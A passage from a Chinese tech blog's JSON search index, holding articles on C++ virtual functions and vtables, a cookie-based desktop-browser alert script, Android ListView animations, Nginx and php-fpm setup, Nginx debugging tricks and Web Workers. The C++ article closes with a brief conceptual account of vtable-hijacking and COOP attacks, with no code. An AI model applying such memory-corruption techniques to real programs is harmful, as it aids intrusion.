BrowserSync确实是一个好东西！ 本文链接： http://www.meng.uno/articles/70440106/ 欢迎转载！","categories":[{"name":"自动化构建工具","slug":"自动化构建工具","permalink":"http://www.meng.uno/categories/自动化构建工具/"}],"tags":[{"name":"Gulp","slug":"Gulp","permalink":"http://www.meng.uno/tags/Gulp/"},{"name":"BrowserSync","slug":"BrowserSync","permalink":"http://www.meng.uno/tags/BrowserSync/"}]},{"title":"虚函数","slug":"virtaul-func","date":"2016-02-20T04:18:29.000Z","updated":"2018-04-10T05:46:42.642Z","comments":true,"path":"articles/dcffa0c0/","link":"","permalink":"http://www.meng.uno/articles/dcffa0c0/","excerpt":"虚函数与多态 继承和多态，是面向对象中老生常谈的话题。C++中，我们也可以经常看到virtaul、override这样的关键字；这正是虚函数的标志。虚函数就是为了解决多态的问题：如果要使用一个基类的指针，根据对象的不同类型去调用相应的函数，就需要使用虚函数了。通俗的说也就是同一个入口，却能够调用不同的方法。 通常，对于虚函数的调用，往往在运行时才能确定调用哪个版本的函数。这是由于基类的指针或者引用，其动态类型必须在运行的时候才能确定（它具体指向了什么类型）。而“动态绑定”就指的在运行时，根据对象的类型，调用具体方法的过程，这个过程正是通过虚函数表实现的。 抽象基类指的是有纯虚函数的类。纯虚函","text":"虚函数与多态 继承和多态，是面向对象中老生常谈的话题。C++中，我们也可以经常看到virtaul、override这样的关键字；这正是虚函数的标志。虚函数就是为了解决多态的问题：如果要使用一个基类的指针，根据对象的不同类型去调用相应的函数，就需要使用虚函数了。通俗的说也就是同一个入口，却能够调用不同的方法。 通常，对于虚函数的调用，往往在运行时才能确定调用哪个版本的函数。这是由于基类的指针或者引用，其动态类型必须在运行的时候才能确定（它具体指向了什么类型）。而“动态绑定”就指的在运行时，根据对象的类型，调用具体方法的过程，这个过程正是通过虚函数表实现的。 抽象基类指的是有纯虚函数的类。纯虚函数，指的是没有函数体的函数，通常通过在函数体的位置写上=0来表示。对于抽象基类，是不能直接创建一个对象的；但是可以创建它它们的派生类的对象：只要它们覆盖了纯虚函数。纯虚函数表示这个函数的具体实现全部交给派生类去做。 虚函数表与虚函数的调用 那么，“动态绑定”是如何实现的呢？这便是借助于虚函数表来实现。对于每个具有虚函数的类，都会有一个对应的虚函数表vtable，其代码和对应内存结构如下所示： class A { int varA; public: virtual int vAfoo(int a, int *b){ return a + (*b); } virtual int vAbar(int a){ return a + 1; } virtual bool vAduh(){ return true; } virtual int vAtest(int a){ return 0; } void Afoo(){ this-&gt;vAduh(); } }; class B { int varB; public: virtual int vBfoo(int a) = 0; virtual bool vBbar(int b){ return b == 0; } char *Bfoo(char *c){ return c; } }; class C : public A, public B { int varC; public: int vAtest(int a){ return -(a); } int vAfoo(int a, int *b){ return *b; } int vBfoo(int a){ return a - 1; } virtual void vCfoo(){} bool vAduh(){ return false; } }; 这个表中的每一项，都是一个虚函数的地址，也就是虚函数的指针。而每个对象的第一个值都是虚标指针，它指向了了所对应虚函数表的第一个表项（也就是虚函数表的基址）。每次调用虚函数时，都会首先通过这个虚表指针，找到虚函数表，然后再在虚函数表中，找到真正的虚函数的地址，并进行调用。假设存在有多继承的情况，那么就会有多个vptr，分别放在对应的基类对象的开头位置。 虚继承 对于“菱形继承”情况（也即两个子类继承同一个父类，而新的子类又同时继承这两个子类），则可能产生二义性问题。例如下面的情况，那么D中就会保存两次A中的变量和函数，并且在使用时也会很不方便，必须利用域作用符来使用变量和函数。 A / \\ B1 B2 \\ / D 虚继承是在继承时，在基类类型前面加上virtual关键字。虚继承能够解决基类多副本的问题：在任何派生类当中，虚基类都是通过一个共享对象来表示的，它们通过指针去访问这个基类中的内容；它不用去保存多份基类的拷贝，而是只需要多出一个指向基类子对象的指针。从内存布局上来说，在虚表的负offset位置，会保存一个指针指向虚基类对象。 也就是说继承自A的虚函数和对象，全部只保存一份在D自身的子对象中，相比不使用虚继承，它删除了B1和B2当中的（2份）基类成员；它自己则需要保存一份基类成员和偏移指针；而如果要用B1和B2的指针或者引用去访问一个D对象时，那么访问A的成员则需要通过间接引用来访问；也就是说子对象需要有一个 偏移量，指示在内存中，基类的位置。其内存布局一般如下： 内存 B1的虚表指针 B1的偏移指针 B1的数据成员 B2的虚表指针 B2的偏移指针 B2的数据成员 D的虚表指针 D的偏移指针 D的数据成员 A的虚表指针 A的数据成员 虚表与劫持攻击 在C程序中，%90以上的间接调用都是vcall。篡改程序中的虚函数调用，是劫持C程序的一种常见手段。这里简单说说常见手段。 一种方法是虚表注入。众所周知，虚表保存在程序的.rodata段中，它是可读，不可写的；而对象当中的虚表指针却是可读写的状态；因此篡改虚表指针是较为直接的方式。 如图，如果利用漏洞（overflow、use-after-free等）在内存中构造一个虚假的虚表，并且将对象中的虚函数指针指向注入的虚假的虚表，那么在虚函数调用时，就会调用虚假的虚函数。甚至只需要一次虚函数调用就能够通过shellcode完成攻击。 当然，如果程序进行了一定程度的保护，例如检查虚表指针是否属于.rodata段，攻击就只能依赖于现有的虚表来构造了。Counterfeit Object-oriented Programming就提出了这样一种方法。 可以看到，这种方法没有注入新的虚表，而是将vptr的值，指向了虚表中的不同位置（而不是虚表的起始地址）。如果能够构造一系列的虚假对象，那么就可以在一次循环中（比如某个对象数组的依次析构），在调用同一个虚函数时，实际上调用不同的函数，从而构造一个虚假的执行链。看到这里，也许你会有疑问：仅仅用有限的虚函数，能够构造图灵计算的攻击吗？答案是肯定的：有兴趣的话可以阅读一下原文，通过拼凑虚函数，是能够组合出各种语义的。 小结 可见，虚函数是面向对象语言中，十分巧妙而又必不可少的设计；但它的特点也使得它成为黑客滥用、攻击的目标。指的庆幸的是，目前已经有一些开销较小的方法，能够保护虚表和虚函数了。 本文链接： http://www.meng.uno/articles/dcffa0c0/ 欢迎转载！","categories":[{"name":"Language","slug":"Language","permalink":"http://www.meng.uno/categories/Language/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://www.meng.uno/tags/C/"},{"name":"虚函数","slug":"虚函数","permalink":"http://www.meng.uno/tags/虚函数/"},{"name":"内存安全","slug":"内存安全","permalink":"http://www.meng.uno/tags/内存安全/"}]},{"title":"判断是否手机登陆","slug":"phone","date":"2016-01-11T12:17:29.000Z","updated":"2018-03-20T10:07:03.301Z","comments":true,"path":"articles/d23d13ae/","link":"","permalink":"http://www.meng.uno/articles/d23d13ae/","excerpt":"需求 项目的网站时做的手机网页，但是没有考虑到自适应pc端，只是在chrome中固定了手机屏幕大小，所以在pc端查看会很丑，布局是乱的；但是重写又很麻烦，所以有必要做一下提醒，让用户手动将网页缩小到手机屏幕大小。 用到 非手机检验和cookie记录 方法 这段代码是使用了cookie来控制的 1. 使用cookie让浏览器记住页面已经打开过一次，当前页面刷新不会弹出提醒。 2. 浏览器一旦关闭，保存这个记录的cookie文件将被删除。重新打开浏览器弹出窗口会再次出现，从而确保了在原有的窗口基础上只打开一次。 判断非手机登陆方式 1 2 if (!/Android|web","text":"需求 项目的网站时做的手机网页，但是没有考虑到自适应pc端，只是在chrome中固定了手机屏幕大小，所以在pc端查看会很丑，布局是乱的；但是重写又很麻烦，所以有必要做一下提醒，让用户手动将网页缩小到手机屏幕大小。 用到 非手机检验和cookie记录 方法 这段代码是使用了cookie来控制的 使用cookie让浏览器记住页面已经打开过一次，当前页面刷新不会弹出提醒。 浏览器一旦关闭，保存这个记录的cookie文件将被删除。重新打开浏览器弹出窗口会再次出现，从而确保了在原有的窗口基础上只打开一次。 判断非手机登陆方式 12 if (!/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) alert(&quot;为了提高体验效果，请把页面缩小成手机屏幕大小。\\n谢谢合作！&quot;); 1234567891011121314151617181920212223242526272829303132333435363738 &lt;script type=&quot;text/javascript&quot;&gt; try&#123; var alertmessage=&quot;为了提高体验效果，请把页面缩小成手机屏幕大小。\\n谢谢合作！&quot;; var once_per_session=1 function get_cookie(Name) &#123; var search = Name + &quot;=&quot; var returnvalue = &quot;&quot;; if (document.cookie.length &gt; 0) &#123; offset = document.cookie.indexOf(search) if (offset != -1) &#123; offset += search.length; end = document.cookie.indexOf(&quot;;&quot;, offset); if (end == -1) end = document.cookie.length; returnvalue=unescape(document.cookie.substring(offset, end)) &#125; &#125; return returnvalue; &#125; function alertornot()&#123; if (get_cookie(&apos;alerted&apos;)==&apos;&apos;)&#123; loadalert(); document.cookie=&quot;alerted=yes&quot;; &#125; &#125; function loadalert()&#123; if (!/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) alert(alertmessage); &#125; if (once_per_session==0) loadalert(); else alertornot(); &#125; catch(e) &#123; alert(e); &#125;&lt;/script&gt; 本文链接： http://www.meng.uno/articles/d23d13ae/ 欢迎转载！","categories":[{"name":"web","slug":"web","permalink":"http://www.meng.uno/categories/web/"}],"tags":[{"name":"phone","slug":"phone","permalink":"http://www.meng.uno/tags/phone/"}]},{"title":"Listview Item进入和删除动画","slug":"listview-animation","date":"2015-11-24T14:08:59.000Z","updated":"2018-03-20T10:07:03.301Z","comments":true,"path":"articles/fb92c8a1/","link":"","permalink":"http://www.meng.uno/articles/fb92c8a1/","excerpt":"从右边划入的动画 * 定义xml动画 1 2 3 4 5 6 * Adapter里只需要写如下代码 1 2 3 4 5 6 7 8 9 1","text":"从右边划入的动画 定义xml动画 123456 &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;translate xmlns:android=\"http://schemas.android.com/apk/res/android\" android:duration=\"@integer/animTime\" android:fromXDelta=\"100%p\" android:toXDelta=\"0%p\" &gt;&lt;/translate&gt; Adapter里只需要写如下代码 123456789101112 @Overridepublic View getChildView(final int groupPosition, int childPosition, boolean isLastChild, View convertView, ViewGroup parent) &#123; .... if (!junk.isAnimatedBefore()) &#123; junk.setAnimatedBefore(true); convertView.startAnimation(AnimationUtils.loadAnimation(mContext, R.anim.slide_left_in)); &#125;else&#123; convertView.clearAnimation(); &#125; return convertView;&#125; 从左边划出的动画 定义xml动画 1234567891011 &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;set xmlns:android=\"http://schemas.android.com/apk/res/android\" android:fillEnabled=\"true\" android:fillAfter=\"true\" android:duration=\"@integer/animTime\"&gt; &lt;translate android:fromXDelta=\"0%p\" android:toXDelta=\"-100%p\"&gt; &lt;/translate&gt;&lt;/set&gt; Adapter里不需要做什么，需要在外面操作ListView. 在外面操作ListView 开始动画 123456789101112131415161718192021222324252627282930313233 private void startBoost() &#123; mIsDeleting = true; boolean hasAnimation = false; long offset = 0; mAnimCount = 0; int groupPosition = -1; int childPosition = -1; Iterator&lt;ArrayList&lt;Junk&gt;&gt; listIterator = mChildren.iterator(); while (listIterator.hasNext()) &#123; groupPosition++; final Iterator&lt;Junk&gt; junkIterator = listIterator.next().iterator(); while (junkIterator.hasNext()) &#123; childPosition++; Junk junk = junkIterator.next(); if (junk.isChecked()) &#123; ... junkIterator.remove(); final View itemView = ListViewUtil.getChildItemView(this, mListView, groupPosition, childPosition); if (itemView != null) &#123; hasAnimation = true; ((Animation) itemView.getTag(R.id.anim)).setAnimationListener(mAnimationListener); ((Animation) itemView.getTag(R.id.anim)).setStartOffset(offset); offset += 100; itemView.startAnimation(((Animation) itemView.getTag(R.id.anim))); &#125; &#125; &#125; &#125; if (!hasAnimation) &#123; deleteCompleted(); &#125;&#125; mAnimationListener定义如下： 12345678910111213141516171819 private Animation.AnimationListener mAnimationListener = new Animation.AnimationListener() &#123; @Override public void onAnimationStart(Animation animation) &#123; mAnimCount++; &#125; @Override public void onAnimationEnd(Animation animation) &#123; mAnimCount--; if (mAnimCount == 0) &#123; deleteCompleted(); &#125; &#125; @Override public void onAnimationRepeat(Animation animation) &#123; &#125;&#125;; 删除完成后需要调用ListViewUtil.clearListViewAnim(this, mListView);,否则原来动画的地方会显示空白。 动画时要禁用OnTouch事件，因为我们做动画时并没有调用mAdapter.notifyDataSetChanged()，所以如果滚动，由于数据没有同步，肯定会挂掉。 禁用OnTouch事件的方法如下 123456789 @Overridepublic boolean dispatchTouchEvent(MotionEvent ev) &#123; // intercept touch event when deleting ,avoid listview get view. if (mIsDeleting) &#123; return true; &#125; return super.dispatchTouchEvent(ev);&#125; ListView的工具方法 12345678910111213141516171819202122232425262728293031323334353637383940 public static View getChildItemView(Context context, FloatingGroupExpandableListView listView, int groupPosition, int childPosition) &#123; long packedPosition = ExpandableListView.getPackedPositionForChild(groupPosition, childPosition); int flatPosition; try &#123; flatPosition = listView.getFlatListPosition(packedPosition); &#125; catch (Exception e) &#123; e.printStackTrace(); return null; &#125; int firstPosition = listView.getFirstVisiblePosition(); int wantedChild = flatPosition - firstPosition; if (wantedChild &lt; 0 || wantedChild &gt;= listView.getChildCount()) &#123; return null; &#125; View childItemView = listView.getChildAt(wantedChild); childItemView.setTag(R.id.anim, AnimationUtils.loadAnimation(context, R.anim.slide_left_out)); return childItemView;&#125;public static View getItemView(Context context, ListView listView, int position) &#123; int firstPosition = listView.getFirstVisiblePosition() - listView.getHeaderViewsCount(); int wantedChild = position - firstPosition; if (wantedChild &lt; 0 || wantedChild &gt;= listView.getChildCount()) &#123; return null; &#125; View wantedView = listView.getChildAt(wantedChild); wantedView.setTag(R.id.anim, AnimationUtils.loadAnimation(context, R.anim.slide_left_out)); return wantedView;&#125;public static void clearListViewAnim(Context context, ListView listView) &#123; int first = listView.getFirstVisiblePosition(); int count = listView.getChildCount() + 2; for (int i = first; i &lt; first + count; i++) &#123; View itemView = getItemView(context, listView, i); if (itemView != null) &#123; itemView.clearAnimation(); &#125; &#125;&#125; 本文链接： http://www.meng.uno/articles/fb92c8a1/ 欢迎转载！","categories":[{"name":"Android","slug":"Android","permalink":"http://www.meng.uno/categories/Android/"}],"tags":[{"name":"listview","slug":"listview","permalink":"http://www.meng.uno/tags/listview/"},{"name":"animation","slug":"animation","permalink":"http://www.meng.uno/tags/animation/"}]},{"title":"Nginx学习","slug":"nginx-1","date":"2015-11-04T13:30:30.000Z","updated":"2018-04-10T05:46:42.637Z","comments":true,"path":"articles/dda0de9c/","link":"","permalink":"http://www.meng.uno/articles/dda0de9c/","excerpt":"nginx 启动/终止/重载入 启动:运行主程序即启动 控制: nginx -s [signal] signal:stop, quit, reload, ropen 应用新的配置: nginx -s reload 配置文件 nginx包含由配置文件中的directives（simple, block）来控制的模块。包含其他directives的block被称为context。不被任何context包含的directives，被称为main context。例如：events和http在main context中，server在http中，location在server中。 几个cont","text":"nginx 启动/终止/重载入 启动:运行主程序即启动 控制: nginx -s [signal] signal:stop, quit, reload, ropen 应用新的配置: nginx -s reload 配置文件 nginx包含由配置文件中的directives（simple, block）来控制的模块。包含其他directives的block被称为context。不被任何context包含的directives，被称为main context。例如：events和http在main context中，server在http中，location在server中。 几个context包括有: 通常一个配置文件会包含有数个通过ports和server name区分的server。对于一个request，nginx会先确定用哪一个server，然后测试其header中的URI是否与server中的location中项一致。 http{ server{ location / { root /data/www; } location /imamges/ { root /data; } } } location指明了用来与URI比对的前缀，对于吻合的请求来说，URI会被添加上root中指定的根路径，来形成完整本地文件系统的路径。 FastCGI server nginx能够讲requests导向FastCGI server。FastCGI server能够运行使用不同框架和编程语言（例如PHP）编写的程序。最为基本的的FastCGI server配置方法是使用fastcgi_pass命令，SCRIPT_FILENAME参数指定了脚本文件的名称，QUERY_STRING参数用来传递request parameters。 server { location / { fastcgi_pass localhost:9000; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param QUERY_STRING $query_string; } location ~ \\.(gif|jpg|png)$ { root /data/images; } } nginx如何处理request nginx首先确定处理request的server，例如配置3个server: server { listen 80; server_name example.org www.example.org; ... } server { listen 80; server_name example.net www.example.net; ... } server { listen 80; server_name example.com www.example.com; ... } nginx检测request的header域“Host”来确定它应该被指向哪一个server。如果request不吻合任何一个server name，或者不包含header，那么会被导向该端口默认的port。对于没有header的request，可以设置一个空的server来专门drop他们，例如，其中code 444表示关闭connection。 server{ listen 80; server_name &quot;&quot;; return 444; } 在多个server监听不同IP地址的情况下，nginx首先会检测request的ip地址和port是否符合server中的listen命令。对于不同的ip，default server可以是不同的。 server { listen 192.168.1.1:80; server_name example.org www.example.org; ... } server { listen 192.168.1.1:80; server_name example.net www.example.net; ... } server { listen 192.168.1.2:80; server_name example.com www.example.com; ... } 那么nginx如何选择处理request的location呢？以一个简单的php网站为例。nginx首先搜索和字符串最长匹配的前缀。在下面的设置中，唯一的前缀位置时&quot;/&quot;，由于它会匹配任何request，所以它会被视为最靠后的选择。然后nginx检查配置文件中，通过正则表达式给出的locations列表。第一次成功匹配就会终止搜索，nginx会使用这个location。nginx只会检查request的URI部分。举例说明: request “/logo.gif&quot;首先匹配了”/&quot;，然后匹配了正则式&quot;.(git|jpg|png)$&quot;，因此它会选择后一个location，通过指令&quot;root /data/www&quot;request会被映射到文件/data/www/logo.gif中。 reqeust “/index.php&quot;首先匹配了”/&quot;，然后匹配了正则式&quot;.(php)$&quot;。因此request会被交给监听localhost:9000的FastCGI server。fastcgi_param命令将其脚本名设置&quot;/data/www/index.php&quot;,随后FastCGI server执行这个文件。（$document_root变量和root命令指定的相同，$fastcgi_script_name与request的URI相同，也即/index.php）。 request “.about.html&quot;只和前缀location”/“匹配，因此，它只会在这个location中被处理。使用“root /data/www”，request被映射到&quot;data/www/about.html”，然后文件被发送到client。 request “/”的处理更为复杂，它只会匹配前缀location&quot;/&quot;，nginx会首先通过index指令来检测时候好存在index文件，如果/data/www/index.html不存在，但/data/www/index.php存在，那么FastCGI server会将其重定位到&quot;index.php&quot;，随后nginx会重新搜索这个location，就像这个request是被用户发送的一样。 server { listen 80; server_name example.org www.example.org; root /data/www; location / { index index.html index.php; } location ~* \\.(gif|jpg|png)$ { expires 30d; } location ~ \\.php$ { fastcgi_pass localhost:9000; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; } } nginx多站点配置 nginx提供了一个配置文件:./nginx/cosnf/nginx.conf。在启动时，nginx也只能使用一个配置文件。那么如何把多个站点的配置文件分开呢？对于不同的站点，可以对每个站点分别编写一个conf文件，然后在nginx.conf中，用include命令把它们包含起来。通常将其放在两个文件夹下: mkdir ./nginx/sites-available/ mkdir ./nginx/sites-enabled/ cp ./nginx/conf/default.conf ./nginx/sites-available/&lt;site&gt; #link to the available site to enable it ln -s ./nginx/sites-available/&lt;site&gt; ./nginx/sites-enabled/&lt;site&gt; ＃include enabled sites in nginx.conf include ./nginx/sites-enabled/* 实际上配置文件可以放在任何位置，只要合理的去include就可以了。 php-fpm安装及配置 php5和php5-fpm的安装： $ sudo apt-get install php5-cli $ sudo apt-get install php5-fpm 在与nginx配合使用时，需要对php-fpm的listen端口进行修改，这个值位于php5/fpm/pool.d/www.conf目录下，原始值为listen = /var/run/php5-fpm.sock。这里修改为listen = 127.0.0.1:9000。其实只要保证listen的值和nginx配置文件的地址:端口一致即可，也即在nginx.conf所包含的配置文件中，处理php的server及location中，设置fastcgi_pass php5-fpm.sock。 配置完成后，启动php5-fpm，利用net-stat命令可以看到对目标地址:端口的监听是否存在，如果存在那么说明php5-fpm是正常工作的 $ php5-fpm $ net-stat -ano|grep 9000 nginx + php配置 nginx和apache的不同之处在于，其本身不具有处理php的能力，它通过fastcgi来与php-fpm进行交互，来完成php文件的运行。因此为nginx和php设置好通讯端口，让两者能够正常交互是最基本的一步。 在nginx.conf（及其所包含文件中），可以通过设置server和location，来处理URI中的php请求。 server { listen 80; server_name localhost; location ~ \\.php${ include fastcgi_params; root html; fastcgi_pass 127.0.0.1:9000; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; } } 在配置完成之后，编写一个index.php文件进行测试。 #index.php &lt;?php phpinfo(); ?&gt; ./nginx -s reload php5-fpm curl localhost/index.php 如果能够显示php的版本信息，说明nginx+php的基本环境搭建成功了。 可能的问题 不能正常处理路径时，修改： /etc/php5/fpm/php.ini中cgi.fix_pathinfo = 0; php5-fpm组和拥护设置不正确： ;/etc/php5/fpm/pool.d/www.conf user = www-data group = www-data 浏览器中以下载方式打开php文件时： /usr/local/nginx/conf/nginx.conf中default_type为text/html; 本文链接： http://www.meng.uno/articles/dda0de9c/ 欢迎转载！","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://www.meng.uno/categories/操作系统/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"http://www.meng.uno/tags/Nginx/"}]},{"title":"Nginx能为前端开发带来什么？","slug":"nginx","date":"2015-11-03T13:30:00.000Z","updated":"2018-03-20T06:59:57.924Z","comments":true,"path":"articles/7b869b23/","link":"","permalink":"http://www.meng.uno/articles/7b869b23/","excerpt":"Nginx与NodeJs （这里的标题有点歧义。此处的NodeJs，皆引申为NodeJs所搭建的服务器。） 有人说，作为一名前端，我的真爱是NodeJs。 同时也认同，抛去性能之类的比较，单纯从实现的角度，NodeJs编写的服务器也能实现Nginx的各种功能。 这些我都赞成，但使用Nginx并不意味着抛弃NodeJs。事实上，它们并不冲突，还可以在一起愉快的玩耍。 在业内，这样的模型已很常见：资源转发，反向代理，静态资源处理，负载均衡，这些事情扔给Nginx来处理，只是几行配置的事情；同时在上游，让NodeJs去处理它最擅长的I/O等事情。 合理分配各自擅长的事情，这样的思路，同样可","text":"Nginx与NodeJs （这里的标题有点歧义。此处的NodeJs，皆引申为NodeJs所搭建的服务器。） 有人说，作为一名前端，我的真爱是NodeJs。 同时也认同，抛去性能之类的比较，单纯从实现的角度，NodeJs编写的服务器也能实现Nginx的各种功能。 这些我都赞成，但使用Nginx并不意味着抛弃NodeJs。事实上，它们并不冲突，还可以在一起愉快的玩耍。 在业内，这样的模型已很常见：资源转发，反向代理，静态资源处理，负载均衡，这些事情扔给Nginx来处理，只是几行配置的事情；同时在上游，让NodeJs去处理它最擅长的I/O等事情。 合理分配各自擅长的事情，这样的思路，同样可以运用于前端开发中。 以前用NodeJs几百行实现的服务器功能，在npm与github的海洋里花尽心思去寻找的模块，也许在Nginx里是一条成熟的配置。它能帮其分担很多事情，节约了成本。 场景一：环境切换 前端开发中，经常面临多个部署环境切换的问题。 我们通常用配hosts的方式去实现。更优化些，我们将机器的服务绑定了不同的域名：比如正式环境是a.qq.com，测试环境是test.a.qq.com。 然而在拓展性和易用性方面，还不足够好。 而Nginx作为反向代理，就很容易处理资源转发的问题。 思路很简单： 读取请求里的cookie，如果键名host_id有值，则代理到这个IP地址； 如果没有，则代理到默认的正式环境（此处举例为1.1.1.1）; 12345678 set $env_id &quot;1.1.1.1&quot;;if ( $http_cookie ~* &quot;host_id=(\\S+)(;.*|$)&quot;) &#123; set $env_id $1;&#125;location / &#123; proxy_set_header Host $host; proxy_pass http://$env_id:80;&#125; 那接下来的事情，就是怎样用最简便的方式，把IP种在cookie里？ 我们应用了nginx-http-footer-filter模块，html文件经过代理时，都注入了一小段js代码。 这段代码，会帮我们展示小菜单，点击某个环境时，则将IP种到cookie里，同时刷新页面，让Nginx完成环境切换。 切换环境，如今只需点击一次。 场景二：SourceMap 在线上环境调试Js代码是件麻烦的事情，因为目前合格的前端部署，代码都应经过压缩。性能问题是优化了，debug可不怎么方便。 而SourceMap正好可以解决此问题。 在最新的各版本浏览器里，如果满足： 压缩后的js文件后面有//# sourceMappingURL=xxx.map格式的注释 浏览器能正常访问到sourceMappingURL 那么，就能把压缩过的代码还原。 要实现这样的功能，就必须： 现网环境不带以上形式的注释，同时访问不到sourceMap（安全性考虑） 测试环境带注释，能访问sourceMap 这样的模型，用反向代理+内容纂改的思路再合适不过。 每次构建编译时，我们会把sourceMap文件存放到一台机器（举例为1.1.1.1），命名为js文件名后加.map后缀。随后，使用Nginx，通过这几行配置就能把此功能实现： 1234 location ~ \\.js$ &#123; footer &quot;\\n//# sourceMappingURL=$request_uri.map&quot;; footer_types &quot;*&quot;;&#125; 只要经过代理，在chrome里，我们能看到每份被压缩过的js文件，都有一个对应的源码文件。 你可以直接使用它来做打断点之类的操作，大大的提升了调试质量。 场景三：内容纂改 其实在以上两个场景里，都涉及了“内容纂改”。 无论是说“纂改”还是“劫持”，大家的印象都不是什么好事情，但另一方面，他们又可以让事情有趣起来。 统一介绍下，Nginx涉及纂改的模块有： nginx_http_footer_filter：往文件的底部添加文字，可包含Nginx的内置变量； nginx_http_addition_module：从一个url去读取内容，将之添加到文件的头部或顶部； nginx_http_sub_module：替换字符 除去上面两种场景，合理运用这些模块对应的配置，可以做出许多小工具，这是很有想象力的事情。 单单针对移动web前端开发，就可以实现： 将weinre脚本插入到html里，让移动web调试更加便捷。 移动web经常用到localStorage优化首屏，但debug时又会受到干扰，通过一个按钮很方便的清除本地缓存。 手机APP内嵌页面，很难将其网址分享给另一个人。通过一个按钮就能生成url对应的二维码等 场景四：本地映射 在Windows下的前端抓包调试，Fiddler+Willow的能力毋庸置疑。 而脱离了.NET体系的Linux和Mac，即使有一些代替工具，但某些方面还是略显不足。 比如：线上接口映射到本地文件。 想到Fiddler的本质也是一个代理，而开启一个有这样能力的Nginx服务，并不是太难的事情。 而且，我们可以做得更灵活，比如： 同时支持慢速调试 同时支持目录层级映射 同时支持正则匹配 JSON返回的数据有可能是变化的（比如分页时候），同时支持动态数据 这些场景，只运用到Nginx里的“rewrite规则”。 从参考的文档可以大致看到，rewrite规则非常灵活，能完成各种场景的转发。 最简单的模型中，我们把所有带cgi-bin路径的请求，rewite到本地的一个服务，同时带上请求的所有参数，仅需这三行配置即可： 123 location ~ /cgi-bin/* &#123; rewrite ^(.*)$ http://127.0.0.1:8080/cgi-bin/ last;&#125; 后续的事情，可以在本地创建一个cgi-bin文件夹，在里面放置需要映射的文本，并开启服务到8080端口即可。 场景五：移动侧调试 Fiddler 有一个勾选项 Allow remote computers to connect，并可以指定 listen port 可以使得手机/其它终端通过将本机设为代理而访问本机环境，与 hosts 配合会很实用。 这个功能，用Nginx也很容易做到。 通过 default_server 作为代理，手机终端通过设置网络代理为本机IP和相应的 listen port，从而可以访问本机的 Web 服务。 其中也是用到了ngx_http_proxy_module模块的配置： 123456789101112131415161718192021 server &#123; listen 80 default_server; server_name localhost; resolver 8.8.8.8; location / &#123; proxy_set_header Host $host; proxy_set_header X-Real-Ip $remote_addr; proxy_set_header X-Forwarded-For $remote_addr; proxy_pass http://$host; &#125;&#125;server &#123; listen 80; server_name ke.qq.com; location / &#123; proxy_set_header Host $host; proxy_set_header X-Real-Ip $remote_addr; proxy_set_header X-Forwarded-For $remote_addr; proxy_pass http://127.0.0.1:9091/; &#125;&#125; 边角料 除去特定场景，Nginx的一些配置也跟前端息息相关。以下简单罗列，作为边角材料。 nginx_http_concat 资源合并，处理CDN combo。例如通过这样的方式http://example.com/??style1.css,style2.css,foo/style3.css访问合并后的资源。 ngx_http_image_filter_module 图片处理。提供图片缩放，jpg压缩，旋转等特性。 适配PC与移动web，总体可运用ngx_http_proxy_module，去实现路径转发。判断平台类型的Nginx配置，在开源项目detectmobilebrowsers中可以找到。 后记 学习Nginx，我本身只是出于开开眼界的目的。而的确发现了一些很有启发性的特质。 于前端开发，无论线上线下，熟练掌握基本配置，可以做出许多提高效率的工具。 但既然是工具，熟手就好。 比如Fiddler直观，但Nginx更底层，更灵活，应当按照实际选择即可。 话说回来，后来心情有些惆怅。 想起之前，我用NodeJs写过一个八百行的本地调试服务，如今更习惯用Nginx的几行配置。 不过我又想，既然我已经花了时间去写，为什么还要花时间去用？！ 本文链接： http://www.meng.uno/articles/7b869b23/ 欢迎转载！","categories":[{"name":"web","slug":"web","permalink":"http://www.meng.uno/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://www.meng.uno/tags/web/"},{"name":"前端","slug":"前端","permalink":"http://www.meng.uno/tags/前端/"},{"name":"node.js","slug":"node-js","permalink":"http://www.meng.uno/tags/node-js/"}]},{"title":"Web Worker","slug":"web-worker","date":"2015-09-25T02:55:00.000Z","updated":"2018-03-20T06:59:57.929Z","comments":true,"path":"articles/da19b401/","link":"","permalink":"http://www.meng.uno/articles/da19b401/","excerpt":"js是单线程的语言，由于此特性，我们在处理并发时需要用到一些技巧，如setTimeout()，setInterval()，调用XMLHttpRequest等。但这里的并发只是非阻塞（参照John Resig的文章How JavaScript Timers Work），真正的多线程编程则需要HTML5的web worker。 worker的使用 web worker的使用非常简单，线程之间通讯的api与html5 postmessage或node.js里面的socket.io方法类似。 通讯： 1. 发送方：postMessage(data) 2. 接收方：onmessage(even","text":"js是单线程的语言，由于此特性，我们在处理并发时需要用到一些技巧，如setTimeout()，setInterval()，调用XMLHttpRequest等。但这里的并发只是非阻塞（参照John Resig的文章How JavaScript Timers Work），真正的多线程编程则需要HTML5的web worker。 worker的使用 web worker的使用非常简单，线程之间通讯的api与html5 postmessage或node.js里面的socket.io方法类似。 通讯： 发送方：postMessage(data) 接收方：onmessage(event) 终止web worker: 子线程: self.close() 父线程: worker.terminate() 按照目前w3c规范，web worker分为两种：专用worker(Dedicated Worker)和共享worker(Shared Worker)。 专用worker 实例化一个web worker对象，异步加载子线程文件worker.js，其中的代码将执行。 var worker = new Worker(&quot;worker.js&quot;); 给worker增加侦听 123 worker.onmessage = function (event) &#123; alert(event.data); &#125;; 在worker.js里，发送消息给父线程 postMessage('hello，imweb'); 在父线程页面就能看到发送过来的信息了。 同时，在web worker标准中，是支持对象参数的，也就是说我们能够传递json数据。再看一个稍微复杂点的例子，父线程： 12345678910111213141516 var worker = new Worker(&quot;worker.js&quot;);worker.onmessage = function (event) &#123;document.getElementById(&quot;result&quot;).innerHTML=event.data;&#125;;function start()&#123; worker.postMessage(&#123;&apos;cmd&apos;: &apos;start&apos;, &apos;msg&apos;: &apos;start&apos;&#125;);&#125;function pause()&#123; worker.postMessage(&#123;&apos;cmd&apos;: &apos;pause&apos;, &apos;msg&apos;: &apos;pause&apos;&#125;);&#125;function stop()&#123; 